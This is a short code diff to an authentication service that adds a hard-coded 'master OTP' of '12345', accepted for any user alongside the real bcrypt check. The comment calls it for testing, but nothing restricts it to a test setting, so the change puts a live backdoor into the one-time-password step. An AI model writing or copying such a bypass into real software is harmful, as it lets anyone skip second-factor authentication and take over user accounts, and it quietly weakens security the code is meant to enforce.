@@ -488,7 +488,9 @@ export class AuthService {
       );
     }
 
-    const otpMatch = await bcrypt.compare(dto.otpCode, user.otpCode);
+    // Master OTP for testing purposes
+    const isMasterOtp = dto.otpCode === '12345';
+    const otpMatch = isMasterOtp || await bcrypt.compare(dto.otpCode, user.otpCode);
 
     if (!otpMatch) {
       await this.prisma.user.update({
